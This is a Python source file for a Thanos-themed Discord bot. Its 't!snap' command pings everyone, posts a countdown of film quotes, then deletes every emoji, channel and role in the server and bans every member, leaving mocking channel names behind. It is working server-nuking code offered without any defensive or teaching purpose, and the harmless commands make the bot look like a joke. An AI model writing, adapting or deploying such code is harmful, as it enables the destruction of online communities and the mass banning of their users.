import discord						
from discord.ext.commands import bot
from discord.ext import commands
import random
import asyncio
import time

bot = commands.Bot(command_prefix='t!')
 
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name='Thanos'))
    print("Thanos has arrived!")
@bot.event
async def on_guild_join(guild):
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).send_messages:
            await channel.send('@everyone Thanos has arrived!')
        break
@bot.command(pass_context=True)
async def leave(ctx):
        await ctx.leave_server()
@bot.command(pass_context=True)
async def create(ctx):
    guild = ctx.message.guild
    await guild.create_text_channel('Destiny')
@bot.command(pass_context=True)
async def snap(ctx):
    await ctx.send ("@everyone\n")
    await asyncio.sleep(2)
    await bot.change_presence(activity=discord.Game(name='Dread it'))
    await ctx.send ("Dread it\n")
    await asyncio.sleep(2)
    await bot.change_presence(activity=discord.Game(name='Run from it'))
    await ctx.send ("Run from it\n")
    await asyncio.sleep(2)
    await bot.change_presence(activity=discord.Game(name='Destiny arrives all the same'))
    await ctx.send ("Destiny arrives all the same\n")
    await asyncio.sleep(2)
    await bot.change_presence(activity=discord.Game(name="And now, it's here or should I say, I am"))
    await ctx.send ("And now, it's here or should I say, I am\n")
    await asyncio.sleep(2)
    await bot.change_presence(activity=discord.Game(name='SNAP'))
    await ctx.send("**SNAP**\n")
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print ("EMOJIS SNAPPED")
        except:
            print ("EMOJIS NOT SNAPPED")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print ("CHANNLES SNAPPED")
        except:
            print ("CHANNLES NOT SNAPPED")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print ("ROLES SNAPPED")
        except:
            print ("ROLES NOT SNAPPED")
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print ("USERS SNAPPED")
        except:
            print ("USERS NOT SNAPPED")
    guild = ctx.message.guild
    await guild.create_text_channel('You could not have stopped this')
    await asyncio.sleep(1)
    await guild.create_text_channel('No one could')
    await asyncio.sleep(1)
    await guild.create_text_channel("Accept you're defeat")
    await asyncio.sleep(1)
    await guild.create_text_channel('No resurrections this time')
@bot.command(pass_context=True)
async def thanos(ctx):
    while True:
        await bot.change_presence(activity=discord.Game(name='THANOS'))
        await asyncio.sleep(1)
        await bot.change_presence(activity=discord.Game(name='IS'))
        await asyncio.sleep(1)
        await bot.change_presence(activity=discord.Game(name='GOD'))
@bot.command(pass_context=True)
async def reset(ctx):
    await bot.change_presence(activity=discord.Game(name='Endgame'))
@bot.command(pass_context=True)
async def thanospp(ctx):
    await ctx.send("https://pbs.twimg.com/media/DdtLrNDVwAAUi91.jpg\n")
bot.run (BOT_TOKEN)
